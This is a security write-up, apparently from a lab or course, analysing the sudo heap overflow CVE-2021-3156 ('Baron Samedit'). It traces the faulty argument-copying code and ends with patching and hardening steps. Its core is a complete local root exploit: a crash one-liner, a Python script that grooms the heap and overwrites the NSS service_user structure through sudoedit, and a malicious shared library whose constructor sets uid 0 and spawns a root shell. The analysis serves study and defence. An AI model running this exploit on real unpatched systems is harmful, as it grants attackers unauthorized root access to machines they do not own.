# Report: Sudo Heap Overflow Baron Samedit (CVE-2021-3156)

![1687653479126](./image/OperatingSystemAttacks/1687653479126.png)

## 1. Table of content

[toc]

## 2. Motivation

This report discusses the CVE-2021-3156, also known as "Baron Samedit," is a critical vulnerability that affects the **sudo command**, a widely used utility in *inux systems. Discovered in January 2021, this vulnerability allows attackers to **escalate their privileges** and execute arbitrary commands as root without knowing the sudo command. This of course **expecting the adversary to have access to a local account in the sudoer group**. The score of the vulberability is (7.8) which is HIGH.
![1687680101260](image/OperatingSystemAttacks/1687680101260.png)

This vulnerability poses a **significant risk** to Linux systems, as sudo is commonly used to execute administrative tasks and manage system security. Exploiting CVE-2021-3156 requires local access or authenticated remote access, making it a valuable target for attackers who have already compromised a system or gained privileged access.

The **root cause** of the vulnerability lies in a **heap-based buffer overflow** within the sudo **command's argument** handling. By crafting a specially crafted input, an attacker can overwrite important data structures and gain unauthorized access.The vulnerability was quickly patched by the sudo development team. But if you don't have an updated versions of the some of Linux distros, you might be in risk.

## 3. In this article

In this article we will:

1. **Setup the environment** for debugging and getting more information.
2. Describe the architecture and **how the vulnerability works**.
3. **Execute an actual exploit** for the CVE on a controlled **lab environment**.
4. Understand the fix and apply the patch on **the sudo package**.
5. Re-check the vulnerability and apply some OS security hardening mechanisms to avoid such vulnerabilities.

## 4. Setup the environment

As per *[REF_ARTICLE_QUALYS]* , the latest environment setup that can have this vulnerability be tested on is:

* Distro: Ubuntu 20.04.1 LTS
* Sudo command version: Sudo version 1.8.31.
* Get the source code for sudo (exploit code is attached).
  Download from here - https://www.sudo.ws/dist/sudo-1.8.31p2.tar.gz

### 4.1. Building the source code `sudo`

*Check the appendices.*

### 4.2. Setup the debugging environment using VSCode

*Check the appendices.*

## 5. Quick Demo

![1687707184916](image/OperatingSystemAttacks/1687707184916.png)

## 6. Understanding the attack

### 6.1. Root cause of the vulnerability

#### 6.1.1. Overview of the vulnerability

It is a **heap-based buffer overflow vulnerability** found in the sudo command, a widely used utility in Linux systems. The vulnerability is caused by an integer overflow when calculating the size of a user-controlled string, which leads to a buffer overflow condition. This allows an attacker to overwrite important data structures and execute arbitrary code with root privileges.

#### 6.1.2. Deep dive into the code

In case of a `MODE_SHELL` or a `MODE_SHELL` or `MODE_LOGIN_SHELL` has been triggered by passing either the `-s` or  `-i` respectively, the `main` function calls `parse_args `which does re-writing for the `argv` passed to be concatenated, and escaping anything that is not alphanumeric #23,#24.

```c
    /*
     * For shell mode we need to rewrite argv
     */
    if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {
	char **av, *cmnd = NULL;
	int ac = 1;

	if (argc != 0) {
	    /* shell -c "command" */
	    char *src, *dst;
	    size_t cmnd_size = (size_t) (argv[argc - 1] - argv[0]) +
		strlen(argv[argc - 1]) + 1;

	    cmnd = dst = reallocarray(NULL, cmnd_size, 2);
	    if (cmnd == NULL)
		sudo_fatalx(U_("%s: %s"), __func__, U_("unable to allocate memory"));
	    if (!gc_add(GC_PTR, cmnd))
		exit(1);

	    for (av = argv; *av != NULL; av++) {
		for (src = *av; *src != '\0'; src++) {
		    /* quote potential meta characters */
		    if (!isalnum((unsigned char)*src) && *src != '_' && *src != '-' && *src != '$')
			*dst++ = '\\';
		    *dst++ = *src;
		}
		*dst++ = ' ';
	    }
	    if (cmnd != dst)
		dst--;  /* replace last space with a NUL */
	    *dst = '\0';

	    ac += 2; /* -c cmnd */
	}
```

So until now the same memory is reallocated, once we reach `sudoers_policy_main()`, `set_cmnd()` concatenates the command-line arguments into a heap-based buffer `user_args`.

```c
   if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {

	/* ..... Some code here (not important to our study) ..... */

	/* set user_args */
	if (NewArgc > 1) {
	    char *to, *from, **av;
	    size_t size, n;

	    /* Alloc and build up user_args. */
	    for (size = 0, av = NewArgv + 1; *av; av++)
		size += strlen(*av) + 1;
	    if (size == 0 || (user_args = malloc(size)) == NULL) {

		/* ..... Some code here (not important to our study) ..... */

	    }
	    if (ISSET(sudo_mode, MODE_SHELL|MODE_LOGIN_SHELL)) {
		for (to = user_args, av = NewArgv + 1; (from = *av); av++) {
		    while (*from) {
			if (from[0] == '\\' && !isspace((unsigned char)from[1]))
			    from++;
			*to++ = *from++;
		    }
		    *to++ = ' ';
		}
		*--to = '\0';
	    }
	/* ..... Some code here (not important to our study) ..... */
	}
    }
```

**Regrettably**, if a command-line argument **ends with a lone backslash** character, the following sequence occurs:

* In line #21, if `from[0]` represents the backslash character `\\` , while `from[1]` corresponds to the null terminator `\0` of the argument, rather than a space character.
* Consequently, in line #22, `from` is incremented causing it to **point to the null terminator**.
* Moving on to line #23, the null terminator is copied to the `user_args` buffer and `from` incremented once again.
* As a result, `from` now **points to the first character beyond the null terminator**, *exceeding the bounds* of the argument.
* This will result in the "while" loop #20:#24 will read and copy the characters outside the argument's bounds into the "user_args" buffer.
* **Thus the heap can be overflown if the before code of `parse_args` was not executed, thus we can hit this.**

### 6.2. Exploitation mechanism for buffer overflow

As per the analysis done in this reference *[REF_REPORT_Qualys]*, it turns out that by observing the wrapping conditions for the 2 steps (escaping the argvs and then copying it to the heap buffer) we can skip the first and do the second only. Enabling us to copy over teh boundaries into the heap. This can be done by:

Using `sudoedit` command instead of `sudo` .

So, `parse_args()` automatically sets MODE_EDIT #5, but does not reset `valid_flags`, and the `valid_flags `include `MODE_SHELL` by default

```c
    /* First, check to see if we were invoked as "sudoedit". */
    proglen = strlen(progname);
    if (proglen > 4 && strcmp(progname + proglen - 4, "edit") == 0) {
	progname = "sudoedit";
	mode = MODE_EDIT;
	sudo_settings[ARG_SUDOEDIT].value = "true";
    }
```

As shown below the `MODE_SHELL` is included in the default valid flags

```c
/*
 * Default flags allowed when running a command.
 */
#define DEFAULT_VALID_FLAGS	(MODE_BACKGROUND|MODE_PRESERVE_ENV|MODE_RESET_HOME|MODE_LOGIN_SHELL|MODE_NONINTERACTIVE|MODE_SHELL)
```

So the usage of `sudoedit` will set both `MODE_SHELL` and `MODE_EDIT` and not the `MODE_RUN`, this will:

1. Skip the escaping code resulting in the buffer have `\` (if we want at the end of the command line arguments).
   `if (ISSET(mode, MODE_RUN) && ISSET(flags, MODE_SHELL)) {`
2. Enter the copy buffer vulnerable code condition that will get confused at the end of `from` buffer
   `if (sudo_mode & (MODE_RUN | MODE_EDIT | MODE_CHECK)) {`

This will result in out-of-bound buffer copy in the heap.

![1687708996718](image/OperatingSystemAttacks/1687708996718.png)

The above screenshot presents the value of the sudo mode inside the `set_cmnd` function, meaning that the `sudo_mode` = `0x20002` = `MODE_SHELL | MODE_EDIT`.

![1687708932360](image/OperatingSystemAttacks/1687708932360.png)

### 6.3. Now what? Crafting the command line for exploitation

Using this command

```bash
sudoedit -s '\' `perl -e 'print "A" x 65536'`
```

We can write AAAAAs in the out-of-bound buffer causing a malloc error like the following

![1687719374531](image/OperatingSystemAttacks/1687719374531.png)

For far utilizing this buffer overflow we need to write on a part of memory that will get triggered by the `sudoedit` executable.

As mentioned in *[REF_REPORT_Qualys]* report, the second exploitation they used was based on **overwriting the struct `service_user`**.

```c
 static int
 nss_load_library (service_user *ni)
 {
   if (ni->library == NULL)
     {

       ni->library = nss_new_service (service_table ?: &default_table,
                                      ni->name);

     }

   if (ni->library->lib_handle == NULL)
     {
       /* Load the shared library.  */
       size_t shlen = (7 + strlen (ni->name) + 3
                       + strlen (__nss_shlib_revision) + 1);
       int saved_errno = errno;
       char shlib_name[shlen];

       /* Construct shared object name.  */
       __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,
                                               "libnss_"),
                                     ni->name),
                           ".so"),
                 __nss_shlib_revision);

       ni->library->lib_handle = __libc_dlopen (shlib_name);
```

The previous code relies on a service user pointer to a strcuture reserved in the heep, this opportunity can be easily transformed to an arbitrary code execution:

1. By overwriting `ni->library` with a NULL pointer, to force the code to go to line #7.
2. Overwriting the `ni->name` (an array of characters, initially "systemd") in the form of "X/X".
3. The code will construct the shared library path shared library "libnss_X/X.so.2" line #21:#25.
4. There will be a code compiled on the form of shared library in the current working directory.
5. The code will execute the shared library `_init()` constructor as root. Now we can do the **privilege escalation**. ☠️☠️☠️☠️☠️

### 6.4. Exploitation code

![1687721878622](image/OperatingSystemAttacks/1687721878622.png)

#### 6.4.1. Python code

For calling the `exec` function to pass arguments and environment variables to the process being called we will use python script:

The python code starts with `\` for the payload, resulting for anything after that being in the overflow heap.

The most important part is the user_service part, as it's the path of the shared library, following the code in `set_cmnd` after  the exploit and tracing each of the mallocs until the `load_nss_library` nx->library allocation, it was (1926 + 12 x 32 )bytes, you will find these values filled with random characters to fill the holes.

```python
import os
import sys
import zlib
import base64
from ctypes import cdll, c_char_p, POINTER

# Implementation of libc.execve 
# argv and envp need to be list with last element=None

def execve(filename, argv, envp):
    libc = cdll.LoadLibrary("libc.so.6")
    libc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)
    cargv = (c_char_p * len(argv))(*argv)
    cenvp = (c_char_p * len(envp))(*envp)
    print("Using execve to execute the process, argv and environment")
    print("Return for the process (if returned will be printed in the next line ")
    print(libc.execve(filename, cargv, cenvp))

def exploit():
    offset = 1926
    # Random letter with some escape character used for reach the address that we want to overwrite
    payload = [b'\\'] * 24 + [b'ZZZZZZZ\\']
    # Some escape character and our malicious file path
    user_service = [b'\\'] * 24 + [b"X/X1234"]
    # Concat the payload with our user_service
    user_service = payload * 12 + user_service

    # lc variable used for creating hole in the heap we use different letter for each variable so we can locate them
    lc = [b"LC_CTYPE=C.UTF-8@"+b'B'*40+b";A=", b"LC_NUMERIC=C.UTF-8@"+b'C'*216, b"LC_TIME=C.UTF-8@"+b'D'*40, b"LC_COLLATE=C.UTF-8@"+b'E'*40, None]


    # Arg and env for our execve 
    arg = [b"sudoedit", b"-A", b"-s", b'A' * 224 + b'\\', None]
    env = [b'B'* offset  + b'\\'] + user_service + lc

    execve(b"/usr/bin/sudo", arg, env)



if __name__ == "__main__":
    exploit()

```

#### 6.4.2. Shared library code .so

The shared library will have simple entry point to escalate the privilege using `setgid` and then calling a shell.

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

// gcc -shared -o X1234.so.2 -fPIC X1234.c

static void _init() __attribute__((constructor));

void _init(void)
{
    puts("\n[+] You got it!");

    setuid(0);
    setgid(0);

    system("/bin/sh 2>&1");
  

}

```

This has been successfully tested on Ubuntu 20.04 (sudo package v1.8.31).

### 6.5. Screenshots while debugging

* I have used a debug trap at the start of the sudo command to easily catch the first entry point of the main function.
* While checking the copy to heap buffer code and understanding how it is working.
  ![1687709723407](image/OperatingSystemAttacks/1687709723407.png)
* Showing the heap overflow with AAAAAAAAA and BBB to fill the holes to the `nx->library` heap structure to override the first entry with NULL, then with the name of the shared library to be loaded.
  ![1687710159956](image/OperatingSystemAttacks/1687710159956.png)
* The malicious shared library execution buffer overflow overwrite
  ![1687710851371](image/OperatingSystemAttacks/1687710851371.png)

In theory, it is improbable for a command-line argument to terminate with a single backslash character. This is because if MODE_SHELL or MODE_LOGIN_SHELL is set (as indicated in line 858, a prerequisite for accessing the vulnerable code), then MODE_SHELL is activated (line 571), and the parse_args() function has already escaped all meta-characters, including backslashes (i.e., it replaced every individual backslash with a double backslash).

However, in practice, there exist slight variations in the conditions surrounding the vulnerable code in set_cmnd() and the escape code in parse_args().

## 7. Mitigation

### 7.1. Partial prevention

Using the sudoer file, and the sudoer group. System admin should only give access to very limited people. Also the execluded binaries from sudoer list should be carefully checked, as some of them might have major bugs that can be used to escalate the privileges.

Usign the command you can delete a user from the sudo group.

```bash
sudo userdel -G sudo username
```

Also update the sudoers file (optional): The user will no longer be a member of the sudoers group, but if you want to remove any specific entries related to the user from the sudoers file, you can use a text editor such as nano or vim to edit the file:

```bash
sudo visudo
```

Locate the relevant line(s) in the sudoers file that grant privileges to the user and remove them. Save the file and exit the editor. After performing these steps, the user will no longer have sudo privileges.

### 7.2. Upgrading to the latest bug fixes for sudo packge

Sudo.ws has fixed this vulnerability in the newly released versions: Sudo 1.9.5p2, released on 26 Jan 2021.

1. Download the [patched sudo ](https://www.sudo.ws/dist/sudo-1.9.5p2.tar.gz)1.9.5p2 version from the site using the wget utility.

```bash
wget https://www.sudo.ws/dist/sudo-1.9.5p2.tar.gz
```

2. Extract it and change directory to the output folder

```bash
tar xvzf sudo-1.9.5p2.tar.gz && cd sudo-19.5p2
```

3. Update make and the build utilities

   ```bash
   sudo apt update && sudo apt install make build-essential
   ```
4. Configure, build and install

   ```
   sudo ./configure && sudo make && sudo make install
   ```

## 8. Resources

1. *[REF_ARTICLE_QUALYS]* [CVE-2021-3156: Heap-Based Buffer Overflow in Sudo (Baron Samedit) | Qualys Security Blog](https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)
2. *[REF_REPORT_Qualys]* [Sudo Heap-Based Buffer Overflow ≈ Packet Storm (packetstormsecurity.com)](https://packetstormsecurity.com/files/161160/Sudo-Heap-Based-Buffer-Overflow.html)
3. [0x7183/CVE-2021-3156: Sudo Heap Overflow Baron Samedit (github.com)](https://github.com/0x7183/CVE-2021-3156)
4. [cve/2021/CVE-2021-3156.md at main · trickest/cve · GitHub](https://github.com/trickest/cve/blob/main/2021/CVE-2021-3156.md)
5. [Step By Step Procedure To Fix The New Sudo Vulnerability (CVE-2021-3156) - The Sec Master](https://thesecmaster.com/fix-the-new-sudo-vulnerability-cve-2021-3156/)
6. [Libc Realpath Buffer Underflow (halfdog.net)](https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/)
7. [Debug an app running in a Docker container (visualstudio.com)](https://code.visualstudio.com/docs/containers/debug-common)

## 9. Appendices

### 9.1. Debugging Dockerized app using Visual Studio Code

I was using VSCode to build and deploy sudo in a container please check my `External/Dockerfile` and `Makefile`. Aso check the Launch.json file for the GDB pipe attach and launch to understand more about the setup.

I have made huge effort regarding this that was not documented here but inside the files.

### 9.2. Building `sudo` package source code

* Install prerequisites for the build
  `sudo apt-get update && sudo apt-get install -yq gcc make wget curl git vim gdb python3 python3-pip bsdmainutils`
* Get the version 1.8.31 for sudo (same default version in Ubuntu 20.04 without any security updates).
  `wget https://www.sudo.ws/dist/sudo-1.8.31p2.tar.gz && tar xvf sudo-1.8.31p2.tar.gz && cd sudo-1.8.31p2 `
* Building the source code of sudo package to be able to debug
  `export CFLAGS="-ggdb" && ./configure && make`
  ![1687682209720](image/OperatingSystemAttacks/1687682209720.png)
